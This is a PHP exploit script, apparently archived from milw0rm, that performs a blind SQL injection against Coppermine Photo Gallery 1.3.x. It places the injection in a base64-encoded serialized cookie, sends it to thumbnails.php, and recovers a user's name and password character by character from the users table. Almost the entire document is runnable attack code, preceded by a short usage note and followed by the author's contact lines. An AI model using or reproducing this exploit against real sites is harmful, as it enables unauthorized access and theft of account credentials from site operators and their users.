<html><head><title>Coppermine Photo Gallery 1.3.x Remote Blind SQL Injection Exploit</title></head><pre>&lt;?
# Coppermine Photo Gallery 1.3.x Blind SQL Injection Exploit
# by s0cratex, RTM Member
# Visit: www.zonartm.org

/*
You need make a small work... Add a fav pic, enter to the site and add
/addfav.php?pid=2 for example..xD
... in the line: if(eregi(&quot;download&quot;,fgets($cnx2))){ $pass.=chr($i); echo
chr($i); break; }  }
the word &quot;download&quot; depends of the language...
*/

# saludos a rgod, OpTix, crypkey 'n mechas...

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

$host = &quot;localhost&quot;; $path = &quot;/cpg&quot;; $port = &quot;80&quot;;
$id = &quot;1&quot;;

echo &quot;Coppermine Photo Gallery 1.3.x fav Blind SQL Injection Exploit\n&quot;;
echo &quot;--------------------------------------------------------------\n&quot;;
echo &quot;\n&quot;;
echo &quot;Username -&gt; &quot;;
$j = 1; $user = &quot;&quot;;
while(!strstr($user,chr(0))){
for($x=0;$x&lt;255;$x++){
$xpl = &quot;'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_name,&quot;.$j.&quot;,1))=&quot;.$x.&quot;),1,0)) FROM cpg131_users WHERE user_id=&quot;.$id.&quot;)/*&quot;;
$xpl = &quot;a:1:{i:0;s:&quot;.strlen($xpl).&quot;:\&quot;&quot;.$xpl.&quot;\&quot;;}&quot;;
$xpl = base64_encode($xpl);
$cnx = fsockopen($host,$port);
fwrite($cnx, &quot;GET &quot;.$path.&quot;/thumbnails.php?album=favpics HTTP/1.0\r\nCookie: cpg131_fav=&quot;.$xpl.&quot;\r\n\r\n&quot;);
while(!feof($cnx)){
if(eregi(&quot;download&quot;,fgets($cnx))){ $user.=chr($x); echo chr($x); break; }  }
fclose($cnx);
if ($x==255) {
die(&quot;\n Try again...&quot;); }
}
$j++;
}
echo &quot;\n&quot;;
echo &quot;Password -&gt; &quot;;
$a = 1; $pass = &quot;&quot;;
while(!strstr($pass,chr(0))){
for($i=0;$i&lt;255;$i++){
$xpl = &quot;'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_password,&quot;.$a.&quot;,1))=&quot;.$i.&quot;),1,0)) FROM cpg131_users WHERE user_id=&quot;.$id.&quot;)/*&quot;;
$xpl = &quot;a:1:{i:0;s:&quot;.strlen($xpl).&quot;:\&quot;&quot;.$xpl.&quot;\&quot;;}&quot;;
$xpl = base64_encode($xpl);
$cnx2 = fsockopen($host,$port);
fwrite($cnx2, &quot;GET &quot;.$path.&quot;/thumbnails.php?album=favpics HTTP/1.0\r\nCookie: cpg131_fav=&quot;.$xpl.&quot;\r\n\r\n&quot;);
while(!feof($cnx2)){
if(eregi(&quot;download&quot;,fgets($cnx2))){ $pass.=chr($i); echo chr($i); break; }
}
fclose($cnx2);
if ($i==255) {
die(&quot;\n Try again...&quot;); }
}
$a++;
}
echo &quot;--------------------------------------------------------------\n&quot;;
echo &quot;s0cratex@zonartm.org || if you speak spanish-&gt;MSN: s0cratex@hotmail.com ..xD\n&quot;;
echo &quot;www.zonartm.org/blog/s0cratex\n&quot;;
echo &quot;plexinium.com comming soon &lt;- Hacking Nica\n&quot;;
?&gt;

# milw0rm.com [2007-02-24]</pre></html>